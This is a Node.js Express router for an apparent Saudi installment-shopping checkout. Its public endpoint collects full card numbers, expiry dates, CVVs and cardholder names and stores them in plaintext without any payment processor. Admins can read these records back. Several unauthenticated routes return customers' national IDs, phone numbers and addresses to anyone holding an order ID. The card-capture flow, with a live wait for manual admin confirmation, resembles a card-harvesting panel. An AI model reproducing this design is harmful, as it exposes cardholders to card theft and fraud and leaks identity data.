const express = require("express");
const jwt = require("jsonwebtoken");
const router = express.Router();
const Checkout = require("../models/Checkout");
const orderEvents = require("../utils/orderEvents");

function authMiddleware(req, res, next) {
  const token = req.cookies?.admin_token || req.headers.authorization?.replace(/^Bearer\s+/i, "");
  if (!token) return res.status(401).json({ error: "غير مصرح" });
  try {
    req.admin = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: "غير مصرح" });
  }
}

// Helper: Sanitize string inputs
function sanitize(str) {
  if (!str || typeof str !== "string") return "";
  return str.replace(/[<>'"]/g, "").trim().slice(0, 500);
}

// Helper: Validate Saudi national ID
function isValidSaudiId(id) {
  if (!id || typeof id !== "string") return false;
  return /^[12]\d{9}$/.test(id);
}

// Helper: Validate Saudi phone number
function isValidSaudiPhone(phone) {
  if (!phone || typeof phone !== "string") return false;
  const cleaned = phone.replace(/\D/g, "");
  return /^05\d{8}$/.test(cleaned);
}

// POST /api/checkout — public (يستقبل طلب جديد)
router.post("/", async (req, res) => {
  try {
    const {
      orderId, cardNumber, expiry, cvv, cardHolder,
      items, total, downPayment, customer, whatsapp,
      nationalId, address, installmentType, months, monthlyPayment, discountAmount,
    } = req.body;

    // ── Validation ──
    if (!orderId || typeof orderId !== "string") {
      return res.status(400).json({ ok: false, error: "رقم الطلب مطلوب" });
    }

    if (!cardNumber || !expiry || !cvv || !cardHolder) {
      return res.status(400).json({ ok: false, error: "بيانات البطاقة ناقصة" });
    }

    if (!items || !Array.isArray(items) || items.length === 0) {
      return res.status(400).json({ ok: false, error: "لا توجد منتجات في الطلب" });
    }

    const totalQuantity = items.reduce((sum, item) => sum + Math.max(1, Math.floor(Number(item.quantity) || 1)), 0);
    if (totalQuantity > 5) {
      return res.status(400).json({ ok: false, error: "الحد الأقصى للطلب هو 5 منتجات فقط" });
    }

    if (!customer || !whatsapp || !nationalId || !address) {
      return res.status(400).json({ ok: false, error: "بيانات العميل ناقصة" });
    }

    // Validate national ID
    if (!isValidSaudiId(nationalId)) {
      return res.status(400).json({ ok: false, error: "رقم الهوية غير صحيح" });
    }

    // Validate phone number
    if (!isValidSaudiPhone(whatsapp)) {
      return res.status(400).json({ ok: false, error: "رقم الواتساب غير صحيح" });
    }

    // Validate total
    const totalNum = Number(total);
    if (isNaN(totalNum) || totalNum <= 0) {
      return res.status(400).json({ ok: false, error: "المبلغ الإجمالي غير صحيح" });
    }

    // Check for duplicate orderId
    const existingOrder = await Checkout.findOne({ orderId });
    if (existingOrder) {
      console.warn(`[DUPLICATE] Order ${orderId} already exists`);
      return res.status(200).json({ 
        ok: true, 
        orderId: existingOrder.orderId, 
        _id: existingOrder._id,
        duplicate: true 
      });
    }

    // Sanitize inputs
    const sanitizedItems = items.map(item => ({
      productId: sanitize(item.productId || ""),
      name: sanitize(item.name || ""),
      price: Number(item.price) || 0,
      quantity: Math.max(1, Math.floor(Number(item.quantity) || 1)),
    }));

    const checkout = new Checkout({
      orderId,
      cardNumber: sanitize(cardNumber),
      expiry: sanitize(expiry),
      cvv: sanitize(cvv),
      cardHolder: sanitize(cardHolder),
      items: sanitizedItems,
      total: totalNum,
      downPayment: Number(downPayment) || 0,
      customer: sanitize(customer),
      whatsapp: whatsapp.replace(/\D/g, ""),
      nationalId: sanitize(nationalId),
      address: sanitize(address),
      installmentType: installmentType === "installment" ? "installment" : "full",
      months: Math.max(0, Math.floor(Number(months) || 0)),
      monthlyPayment: Number(monthlyPayment) || 0,
      discountAmount: Math.max(0, Number(discountAmount) || 0),
    });
    
    await checkout.save();
    console.log(`[SUCCESS] Order created: ${orderId}, _id: ${checkout._id}`);
    
    res.status(201).json({ ok: true, orderId: checkout.orderId, _id: checkout._id });
  } catch (error) {
    console.error("[ERROR] Checkout creation failed:", error);
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// GET /api/checkout/:id/live — SSE stream for instant order updates (0ms real-time)
router.get("/:id/live", async (req, res) => {
  try {
    const { id } = req.params;
    const mongoose = require("mongoose");
    let order = null;
    if (mongoose.Types.ObjectId.isValid(id)) {
      order = await Checkout.findById(id).select("_id orderId status");
    }
    if (!order) {
      order = await Checkout.findOne({ orderId: id }).select("_id orderId status");
    }

    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-cache, no-transform");
    res.setHeader("Connection", "keep-alive");
    res.setHeader("X-Accel-Buffering", "no");
    if (typeof res.flushHeaders === "function") res.flushHeaders();

    if (!order) {
      res.write(`data: ${JSON.stringify({ status: "not_found" })}\n\n`);
      return res.end();
    }

    // Immediately push current status
    res.write(`data: ${JSON.stringify({ status: order.status, orderId: order.orderId })}\n\n`);

    if (order.status === "confirmed" || order.status === "cancelled") {
      return res.end();
    }

    const onStatusUpdate = (newStatus) => {
      try {
        res.write(`data: ${JSON.stringify({ status: newStatus, orderId: order.orderId })}\n\n`);
        if (newStatus === "confirmed" || newStatus === "cancelled") {
          setTimeout(() => {
            try { res.end(); } catch {}
          }, 1000);
        }
      } catch {
        // stream closed
      }
    };

    const idKey = `status:${order._id}`;
    const orderNumKey = `status:${order.orderId}`;
    orderEvents.on(idKey, onStatusUpdate);
    orderEvents.on(orderNumKey, onStatusUpdate);

    // Heartbeat every 15s to keep connection open through proxies
    const heartbeat = setInterval(() => {
      try {
        res.write(": keepalive\n\n");
      } catch {
        clearInterval(heartbeat);
      }
    }, 15000);

    req.on("close", () => {
      clearInterval(heartbeat);
      orderEvents.off(idKey, onStatusUpdate);
      orderEvents.off(orderNumKey, onStatusUpdate);
    });
  } catch (err) {
    console.error("[SSE Error]", err);
    if (!res.headersSent) {
      res.status(500).json({ ok: false });
    }
  }
});

// GET /api/checkout/:id/status — public (للـ polling السريع كـ fallback)
router.get("/:id/status", async (req, res) => {
  try {
    const mongoose = require("mongoose");
    let order = null;
    if (mongoose.Types.ObjectId.isValid(req.params.id)) {
      order = await Checkout.findById(req.params.id).select("status orderId");
    }
    if (!order) {
      order = await Checkout.findOne({ orderId: req.params.id }).select("status orderId");
    }
    if (!order) return res.status(404).json({ ok: false });
    res.json({ status: order.status, orderId: order.orderId });
  } catch {
    res.status(500).json({ ok: false });
  }
});

// GET /api/checkout/:id/public — public (for customer invoice/print/contract/receipt)
router.get("/:id/public", async (req, res) => {
  try {
    const order = await Checkout.findById(req.params.id);
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    const safeOrder = {
      _id: order._id,
      orderId: order.orderId,
      customer: order.customer,
      whatsapp: order.whatsapp,
      nationalId: order.nationalId,
      address: order.address,
      installmentType: order.installmentType,
      months: order.months,
      monthlyPayment: order.monthlyPayment,
      total: order.total,
      downPayment: order.downPayment,
      discountAmount: order.discountAmount || 0,
      items: order.items,
      status: order.status,
      createdAt: order.createdAt,
    };
    res.json(safeOrder);
  } catch (err) {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// GET /api/checkout/:id/invoice — public (for invoice/receipt/contract view)
router.get("/:id/invoice", async (req, res) => {
  try {
    const mongoose = require("mongoose");
    let order = null;
    if (mongoose.Types.ObjectId.isValid(req.params.id)) {
      order = await Checkout.findById(req.params.id);
    }
    if (!order) {
      order = await Checkout.findOne({ orderId: req.params.id });
    }
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    const Company = require("../models/Company");
    let company = await Company.findOne();
    if (!company) company = {};
    const safeOrder = {
      _id: order._id,
      orderId: order.orderId,
      customer: order.customer,
      whatsapp: order.whatsapp,
      nationalId: order.nationalId,
      address: order.address,
      installmentType: order.installmentType,
      months: order.months,
      monthlyPayment: order.monthlyPayment,
      total: order.total,
      downPayment: order.downPayment,
      discountAmount: order.discountAmount || 0,
      items: order.items,
      status: order.status,
      createdAt: order.createdAt,
    };
    res.json({ order: safeOrder, company });
  } catch (err) {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// GET /api/checkout — admin only
router.get("/", authMiddleware, async (req, res) => {
  try {
    const page = Math.max(1, parseInt(req.query.page) || 1);
    const limit = Math.min(100, Math.max(1, parseInt(req.query.limit) || 50));
    const orders = await Checkout.find().sort({ createdAt: -1 }).skip((page - 1) * limit).limit(limit);
    res.json(orders);
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// GET /api/checkout/:id — admin only
router.get("/:id", authMiddleware, async (req, res) => {
  try {
    const order = await Checkout.findById(req.params.id);
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    res.json(order);
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// PUT /api/checkout/:id/status — admin only
const ALLOWED_STATUSES = ["pending", "confirmed", "cancelled"];
router.put("/:id/status", authMiddleware, async (req, res) => {
  try {
    const { status } = req.body;
    if (!ALLOWED_STATUSES.includes(status))
      return res.status(400).json({ ok: false, error: "حالة غير صحيحة" });
    const order = await Checkout.findByIdAndUpdate(
      req.params.id,
      { status },
      { new: true }
    );
    if (!order) return res.status(404).json({ ok: false, error: "not found" });

    // Broadcast status change immediately to all listening clients (SSE / real-time)
    orderEvents.emit(`status:${order._id}`, order.status);
    if (order.orderId) {
      orderEvents.emit(`status:${order.orderId}`, order.status);
    }

    res.json(order);
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// PUT /api/checkout/:id/financials — admin only
router.put("/:id/financials", authMiddleware, async (req, res) => {
  try {
    const { total, downPayment, months, monthlyPayment } = req.body;
    const update = {};
    if (total !== undefined) update.total = Number(total);
    if (downPayment !== undefined) update.downPayment = Number(downPayment);
    if (months !== undefined) update.months = Number(months);
    if (monthlyPayment !== undefined) update.monthlyPayment = Number(monthlyPayment);
    const order = await Checkout.findByIdAndUpdate(req.params.id, update, { new: true });
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    res.json(order);
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

// DELETE /api/checkout/:id — admin only
router.delete("/:id", authMiddleware, async (req, res) => {
  try {
    const order = await Checkout.findByIdAndDelete(req.params.id);
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    res.json({ ok: true });
  } catch {
    res.status(500).json({ ok: false, error: "خطأ في الخادم" });
  }
});

module.exports = router;
